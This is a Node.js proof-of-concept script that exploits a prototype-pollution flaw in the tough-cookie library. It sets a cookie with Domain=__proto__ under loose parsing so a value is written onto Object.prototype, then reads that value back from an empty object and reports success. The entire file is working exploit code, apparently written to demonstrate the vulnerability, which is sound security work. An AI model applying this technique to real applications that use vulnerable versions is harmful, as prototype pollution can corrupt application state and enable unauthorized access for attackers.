const tough = require("tough-cookie");

// Function to create a "cookie jar"
async function createCookieJar() {
  console.log("Creating a new cookie jar...");
  return new tough.CookieJar(undefined, { rejectPublicSuffixes: false });
}

// Function to set a cookie that exploits the vulnerability
async function setExploitCookie(cookieJar) {
  console.log("Setting an exploit cookie...");
  return new Promise((resolve, reject) => {
    cookieJar.setCookie(
      "Slonser=polluted; Domain=__proto__; Path=/notauth",  // Exploit cookie to pollute the __proto__ object
      "https://__proto__/admin",  // Target URL, attacker sets a cookie with __proto__ as the domain
      { loose: true },  // Allow loose cookie parsing, which is part of the vulnerability
      (err, cookie) => {
        if (err) {
          reject(err);  // Reject if an error occurs
        } else {
          resolve(cookie);  // Resolve if the cookie is set successfully
        }
      }
    );
  });
}

// Function to demonstrate the exploitation of the vulnerability
function exploitCookie() {
  console.log("Trying to access the exploit cookie...");
  const a = {};  // Create an empty object to manipulate
  console.log(a["/notauth"]["Slonser"]);  // This accesses the polluted __proto__ field, demonstrating the vulnerability
  // The above line attempts to retrieve the value of `Slonser` which was added to the __proto__ object by the malicious cookie.
  // This can lead to various exploits like overwriting properties of other objects, data corruption, and even unauthorized access.
}

// Main function that orchestrates all actions
async function main() {
  try {
    const cookieJar = await createCookieJar();  // Create the cookie jar
    await setExploitCookie(cookieJar);  // Set the exploit cookie
    exploitCookie();  // Demonstrate the exploitation of the vulnerability
    console.log("EXPLOITED SUCCESSFULLY");  // If everything works, print success
  } catch (error) {
    console.error("Error:", error);  // Print any errors that occur during the process
    console.log("EXPLOIT FAILED");  // If an error occurs, print failure
  }
}

// Run the main function
main();
